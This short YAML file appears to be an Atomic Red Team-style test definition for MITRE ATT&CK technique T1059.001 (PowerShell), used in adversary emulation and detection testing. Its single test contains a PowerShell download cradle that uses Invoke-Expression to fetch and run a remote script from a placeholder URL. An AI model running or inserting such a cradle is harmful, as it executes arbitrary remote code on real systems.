raw_yaml:
attack_technique: T1059.001
display_name: PowerShell
atomic_tests:
- name: Invoke-Expression Cradle
  description: |
    Downloads and executes a PowerShell script from a remote URL.
  supported_platforms: [windows]
  executor:
    command: |
      IEX (New-Object Net.WebClient).DownloadString('https://example.com/payload.ps1')
    name: powershell
